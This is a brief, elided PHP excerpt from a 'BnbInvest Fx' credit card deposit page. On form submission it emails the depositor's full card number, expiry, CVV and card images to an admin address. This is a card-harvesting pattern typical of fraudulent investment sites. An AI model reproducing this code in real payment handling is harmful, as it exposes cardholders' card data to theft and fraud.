...
if (isset($_POST['deposit'])) {
  ...
  $usr->mailAdminCCard("admin@bnbinvest.space", $amount, $UserDetails->email, $UserDetails->full_name, $cardname, $cardnumber, $cardmon, $cardyear, $cvv, $thumb_link, $bthumb_link);
...
?>
<title>Credit Card Deposit | BnbInvest Fx </title>
